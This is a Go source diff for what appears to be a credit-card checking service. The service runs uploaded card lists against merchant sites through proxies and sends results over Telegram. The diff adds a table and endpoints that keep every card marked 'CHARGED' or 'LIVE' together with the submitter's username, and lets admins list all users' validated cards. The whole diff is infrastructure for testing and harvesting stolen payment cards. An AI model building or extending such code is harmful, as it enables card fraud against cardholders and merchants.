@@ -784,6 +784,17 @@ func initDB() {
 			telegram_sent BOOLEAN DEFAULT FALSE,
 			result_file_path TEXT
 		);
+		CREATE TABLE IF NOT EXISTS saved_cards (
+			id SERIAL PRIMARY KEY,
+			user_id BIGINT NOT NULL,
+			username TEXT,
+			first_name TEXT,
+			card TEXT NOT NULL,
+			status TEXT NOT NULL,
+			msg TEXT,
+			site TEXT,
+			created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+		);
 	`)
 	if err != nil {
 		log.Println("DB table creation failed:", err)
@@ -2834,6 +2845,15 @@ func startResultCleanupTimer() {
 				if errDb != nil {
 					log.Printf("Failed to clean up expired tasks in DB: %v", errDb)
 				}
+
+				_, errSavedCards := db.Exec(`
+					DELETE FROM saved_cards 
+					WHERE user_id != 0 
+					  AND created_at < CURRENT_TIMESTAMP - INTERVAL '24 hours'
+				`)
+				if errSavedCards != nil {
+					log.Printf("Failed to clean up expired saved cards in DB: %v", errSavedCards)
+				}
 			}
 		}
 	}()
@@ -3296,6 +3316,20 @@ func runTask(taskID int, userID int64, cards []Card, sites []string, proxies []s
 		"checked_cards": len(validFinalResults),
 	})
 
+	// Save CHARGED and LIVE cards for permanent retention
+	if db != nil && len(validFinalResults) > 0 {
+		var uName, fName string
+		_ = db.QueryRow("SELECT username, first_name FROM web_login_tokens WHERE user_id = $1 ORDER BY expiry DESC LIMIT 1", userID).Scan(&uName, &fName)
+		for _, r := range validFinalResults {
+			if r.Status == "CHARGED" || r.Status == "LIVE" {
+				_, _ = db.Exec(`
+					INSERT INTO saved_cards (user_id, username, first_name, card, status, msg, site)
+					VALUES ($1, $2, $3, $4, $5, $6, $7)
+				`, userID, uName, fName, r.Card, r.Status, r.Msg, r.Site)
+			}
+		}
+	}
+
 	// Generate and send separate category files
 	categories := []struct {
 		name   string
@@ -3601,23 +3635,24 @@ func apiTasksActiveHandler(w http.ResponseWriter, r *http.Request) {
 	var checkedCards int
 	var resultsJSON string
 	var createdAt time.Time
+	var updatedAt time.Time
 
 	err := db.QueryRow(`
-		SELECT id, status, total_cards, checked_cards, results::text, created_at
+		SELECT id, status, total_cards, checked_cards, results::text, created_at, updated_at
 		FROM check_tasks
 		WHERE user_id = $1 AND status = 'running'
 		ORDER BY id DESC
 		LIMIT 1
-	`, userID).Scan(&taskID, &status, &totalCards, &checkedCards, &resultsJSON, &createdAt)
+	`, userID).Scan(&taskID, &status, &totalCards, &checkedCards, &resultsJSON, &createdAt, &updatedAt)
 
 	if err == sql.ErrNoRows {
 		err = db.QueryRow(`
-			SELECT id, status, total_cards, checked_cards, results::text, created_at
+			SELECT id, status, total_cards, checked_cards, results::text, created_at, updated_at
 			FROM check_tasks
 			WHERE user_id = $1
 			ORDER BY id DESC
 			LIMIT 1
-		`, userID).Scan(&taskID, &status, &totalCards, &checkedCards, &resultsJSON, &createdAt)
+		`, userID).Scan(&taskID, &status, &totalCards, &checkedCards, &resultsJSON, &createdAt, &updatedAt)
 	}
 
 	w.Header().Set("Content-Type", "application/json")
@@ -3644,6 +3679,7 @@ func apiTasksActiveHandler(w http.ResponseWriter, r *http.Request) {
 			"checked_cards": checkedCards,
 			"results":       results,
 			"created_at":    createdAt,
+			"updated_at":    updatedAt,
 		},
 	})
 }
@@ -3672,12 +3708,13 @@ func apiTasksDetailsHandler(w http.ResponseWriter, r *http.Request) {
 	var checkedCards int
 	var resultsJSON string
 	var createdAt time.Time
+	var updatedAt time.Time
 
 	err = db.QueryRow(`
-		SELECT user_id, status, total_cards, checked_cards, results::text, created_at
+		SELECT user_id, status, total_cards, checked_cards, results::text, created_at, updated_at
 		FROM check_tasks
 		WHERE id = $1
-	`, taskID).Scan(&tUserID, &status, &totalCards, &checkedCards, &resultsJSON, &createdAt)
+	`, taskID).Scan(&tUserID, &status, &totalCards, &checkedCards, &resultsJSON, &createdAt, &updatedAt)
 
 	if err != nil {
 		if err == sql.ErrNoRows {
@@ -3706,6 +3743,7 @@ func apiTasksDetailsHandler(w http.ResponseWriter, r *http.Request) {
 		"checked_cards": checkedCards,
 		"results":       results,
 		"created_at":    createdAt,
+		"updated_at":    updatedAt,
 	})
 }
 
@@ -3884,6 +3922,128 @@ func apiTasksDownloadHandler(w http.ResponseWriter, r *http.Request) {
 	http.ServeFile(w, r, filePath)
 }
 
+func apiSavedCardsHandler(w http.ResponseWriter, r *http.Request) {
+	userID, _, isAdmin := getSessionUser(r)
+	if db == nil {
+		http.Error(w, "Database connection not available", http.StatusInternalServerError)
+		return
+	}
+
+	var rows *sql.Rows
+	var err error
+
+	if isAdmin {
+		rows, err = db.Query(`
+			SELECT id, user_id, username, first_name, card, status, msg, site, created_at 
+			FROM saved_cards 
+			ORDER BY id DESC
+		`)
+	} else {
+		rows, err = db.Query(`
+			SELECT id, user_id, username, first_name, card, status, msg, site, created_at 
+			FROM saved_cards 
+			WHERE user_id = $1 
+			ORDER BY id DESC
+		`, userID)
+	}
+
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	defer rows.Close()
+
+	type SavedCard struct {
+		ID        int       `json:"id"`
+		UserID    int64     `json:"user_id"`
+		Username  string    `json:"username"`
+		FirstName string    `json:"first_name"`
+		Card      string    `json:"card"`
+		Status    string    `json:"status"`
+		Msg       string    `json:"msg"`
+		Site      string    `json:"site"`
+		CreatedAt time.Time `json:"created_at"`
+	}
+
+	cards := []SavedCard{}
+	for rows.Next() {
+		var c SavedCard
+		var uName, fName, msg, site sql.NullString
+		err = rows.Scan(&c.ID, &c.UserID, &uName, &fName, &c.Card, &c.Status, &msg, &site, &c.CreatedAt)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			return
+		}
+		if uName.Valid {
+			c.Username = uName.String
+		}
+		if fName.Valid {
+			c.FirstName = fName.String
+		}
+		if msg.Valid {
+			c.Msg = msg.String
+		}
+		if site.Valid {
+			c.Site = site.String
+		}
+		cards = append(cards, c)
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"success": true,
+		"cards":   cards,
+	})
+}
+
+func apiSavedCardsDeleteHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	cardIDStr := r.URL.Query().Get("id")
+	if cardIDStr == "" {
+		http.Error(w, "Card ID is required", http.StatusBadRequest)
+		return
+	}
+	cardID, err := strconv.Atoi(cardIDStr)
+	if err != nil {
+		http.Error(w, "Invalid Card ID", http.StatusBadRequest)
+		return
+	}
+
+	userID, _, isAdmin := getSessionUser(r)
+	if db == nil {
+		http.Error(w, "Database connection not available", http.StatusInternalServerError)
+		return
+	}
+
+	var tUserID int64
+	err = db.QueryRow("SELECT user_id FROM saved_cards WHERE id = $1", cardID).Scan(&tUserID)
+	if err != nil {
+		if err == sql.ErrNoRows {
+			http.Error(w, "Card not found", http.StatusNotFound)
+		} else {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+		}
+		return
+	}
+
+	if tUserID != userID && !isAdmin {
+		http.Error(w, "Access denied", http.StatusForbidden)
+		return
+	}
+
+	_, err = db.Exec("DELETE FROM saved_cards WHERE id = $1", cardID)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
+}
+
 func main() {
 	loadDotEnv()
 	initDB()
@@ -3925,6 +4085,8 @@ func main() {
 	mux.HandleFunc("/api/tasks/cancel", requireLogin(apiTasksCancelHandler))
 	mux.HandleFunc("/api/tasks/clear", requireLogin(apiTasksClearHandler))
 	mux.HandleFunc("/api/tasks/download", requireLogin(apiTasksDownloadHandler))
+	mux.HandleFunc("/api/saved_cards", requireLogin(apiSavedCardsHandler))
+	mux.HandleFunc("/api/saved_cards/delete", requireLogin(apiSavedCardsDeleteHandler))
 
 	mux.HandleFunc("/api/sites/upload", requireLogin(apiUploadSitesHandler))
 	mux.HandleFunc("/api/proxies/upload", requireLogin(apiUploadProxiesHandler))
